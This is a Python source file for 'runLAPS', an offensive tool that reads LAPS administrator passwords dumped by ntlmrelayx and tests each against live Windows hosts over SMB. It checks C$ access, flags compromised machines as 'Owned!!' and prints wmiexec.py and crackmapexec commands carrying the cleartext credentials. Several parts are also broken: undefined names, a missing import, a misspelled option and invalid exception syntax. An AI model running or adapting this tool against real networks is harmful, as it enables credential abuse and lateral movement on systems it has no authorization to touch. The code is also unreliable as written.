#!/usr/bin/python3
# coding: utf-8
# By Leon Johnson - twitter.com/sho_luv

# runLAPS is a tool to test dumped laps files against live networks

import os
import sys
import socket
import logging
import argparse
from impacket import smb
from termcolor import colored, cprint
from impacket.smbconnection import SMBConnection # used impacket to connect to smb
from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP

# set logging error to remove ERROR:root:
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

NOCOLOR='\033[0m'
RED='\033[0;31m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHTGRAY='\033[0;37m'
DARKGRAY='\033[1;30m'
LIGHTRED='\033[1;31m'
LIGHTGREEN='\033[1;32m'
YELLOW='\033[1;33m'
LIGHTBLUE='\033[1;34m'
LIGHTPURPLE='\033[1;35m'
LIGHTCYAN='\033[1;36m'
WHITE='\033[1;37m'


class LapsRecord:

    local_auth = "."

    def __init__(self, hostname, username, password):
        self.hostname = hostname
        self.username = username
        self.password = password
        self.admin_privs = False

        try:
            self.ipAddress = socket.gethostbyname(hostname)
        except Exception as e:
            if options.verbose:
                logger.error(RED+"Host "+hostname+" did not resolve."+NOCOLOR)
            self.ipAddress = None

def ntlmrelayx_laps(laps_file, username):
    # Open laps file generated by ntlmrelayx.py
    with open (laps_file, "r") as fileHandler:
        # Read each line in loop
        count = 0
        for line in fileHandler:
            # As each line (except last one) will contain new line character, so strip that
            if 'DN:' in line:
                hostname = (line.split(',')[0]).split('=')[1]
                count += 1
                #command = " ".join(line.split(" ")[7:])
            if 'Password' in line:
                line[9:]
                password = (line[9:]).strip()
                count += 1
            if count == 2:
                laps = LapsRecord(hostname, username, password)
                laps.username = username
                if laps.ipAddress:
                    login(laps)
                count = 0 

def login(cls):
    try:
        timeout = 1

        cprint("Testing host: %s and password: %s with username: %s" %
                (cls.hostname, cls.password, cls.username))
        try:
            smbClient = SMBConnection(cls.address, cls.address, None, 
                    sess_port=int(options.port), preferredDialect=SMB_DIALECT,
                    timeout=options.timout)
            cls.smbv1 = True 
        except Exception as e:
            pass
        try:
            smbClient = SMBConnection(cls.hostname, cls.hostname,
                    sess_port=int(options.port), timeout=timeout)
            cls.smbv1 = False
        except Exception as e:
            pass

        try:
            smbClient.login(cls.username, cls.password, cls.local_auth)
        except Exception as e:
            if options.verbose:
                logger.error(RED+"Connection to host "+hostname+" timedout"+NOCOLOR)
            return None

        # get computer information
        cls.domain = smbClient.getServerDomain()
        cls.fqdn = smbClient.getServerDNSDomainName()
        cls.osVersion = smbClient.getServerOS()
        cls.os_arch = get_os_arch(cls.ipAddress)
        cls.signing = smbClient.isSigningRequired()
        try:
            smbClient.connectTree("C$")
            cls.admin_privs = True
        except Exception as e:
            pass

        print_info(cls)

    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))

def get_os_arch(ipAddress):
    try:
        stringBinding = r'ncacn_ip_tcp:{}[135]'.format(ipAddress)
        transport = DCERPCTransportFactory(stringBinding)
        transport.set_connect_timeout(5)
        dce = transport.get_dce_rpc()
        dce.connect()
        try:
            dce.bind(MSRPC_UUID_PORTMAP, transfer_syntax=('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0'))
        except (DCERPCException, e):
            if str(e).find('syntaxes_not_supported') >= 0:
                dce.disconnect()
                return "x32"
        else:
            dce.disconnect()
            return "x64"

    except Exception as e:
        logging.debug('Error retrieving os arch of {}: {}'.format(ipAddress, str(e)))

    return 0

def is_admin(cls):
    if cls.admin_privs: 
        print(LIGHTGREEN+"[*] "+NOCOLOR, end = '')
    else:
        print(RED+"[*] "+NOCOLOR, end = '')


def print_info(cls):

        is_admin(cls)
        print(cls.osVersion+" "+str(cls.os_arch)+" (name:"+cls.hostname+") (domain:"+
                cls.fqdn+") (signing:"+str(cls.signing)+") (SMBv1:"+
                str(cls.smbv1)+")"+NOCOLOR, end='')

        if cls.admin_privs:
            print(YELLOW+" Owned!!"+NOCOLOR)
            is_admin(cls)
            print("Local accounts admin rights:")
        else:
            print()
            is_admin(cls)
            print("Local accounts without admin rights:")

        is_admin(cls)
        print("wmiexec.py \'"+cls.username+":"+cls.password+"\'@"+cls.ipAddress+NOCOLOR)
        is_admin(cls)
        print("crackmapexec smb "+cls.hostname+" -u "+cls.username+" -p "+cls.password+NOCOLOR+"\n")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='This program reads LAPS dumps and attempts to verify them')
    parser.add_argument('-f', action='store', metavar='laps file', help='ntlmrelayx laps format file')
    parser.add_argument('-u', action='store', metavar='username or file', help='username or file to try')
    parser.add_argument('-v','--verbose', action='store_true', help='view verbose messages')
    group = parser.add_argument_group('connection')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if not os.path.isfile(options.f):
       print("File path {} does not exist. Exiting...".format(options.f))
       parser.print_help()
       sys.exit()
    else:
        ntlmrelayx_laps(options.f, options.u)
